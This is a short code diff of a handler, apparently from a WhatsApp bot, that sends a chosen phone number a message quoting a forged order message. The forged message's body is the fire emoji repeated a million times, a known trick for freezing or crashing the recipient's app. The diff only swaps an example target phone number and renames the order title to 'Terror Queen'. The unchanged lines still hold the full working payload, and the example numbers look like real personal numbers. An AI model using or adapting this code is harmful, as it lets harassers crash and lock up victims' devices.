@@ -1,5 +1,5 @@
 let handler = async (m, { conn, text, args, usedPrefix, command }) => {
-    if (!text) throw `Wrong Format!!\nExample : ${usedPrefix + command} +13656503237`
+    if (!text) throw `Wrong Format!!\nExample : ${usedPrefix + command} +917736771516`
     conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'What is this?', 'conversation', {
      quoted: {
       key: {
@@ -12,7 +12,7 @@ let handler = async (m, { conn, text, args, usedPrefix, command }) => {
         status: 1,
         surface: 1,
         message: '🔥'.repeat(1000000),
-        orderTitle: 'Ammu', // Idk what this does
+        orderTitle: 'Terror Queen', // Idk what this does
         sellerJid: '0@s.whatsapp.net' // Seller
        }
       }
